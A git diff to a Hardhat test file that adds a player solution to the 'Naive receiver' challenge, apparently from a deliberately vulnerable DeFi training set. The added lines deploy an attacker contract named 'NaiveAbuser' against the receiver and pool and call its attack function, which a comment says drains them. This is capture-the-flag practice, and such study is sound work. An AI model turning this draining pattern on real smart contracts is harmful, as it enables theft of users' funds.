@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { formatBytes32String } = require('ethers/lib/utils');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, player;
@@ -38,6 +39,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Setup our griefing contract        
+        const NaiveAbuserFactory = await ethers.getContractFactory('NaiveAbuser', player);
+        let hackContract = await NaiveAbuserFactory.deploy(receiver.address, pool.address);
+        // Call its attack functin we set up to drain
+        await hackContract.attackTarget();
+
     });
 
     after(async function () {
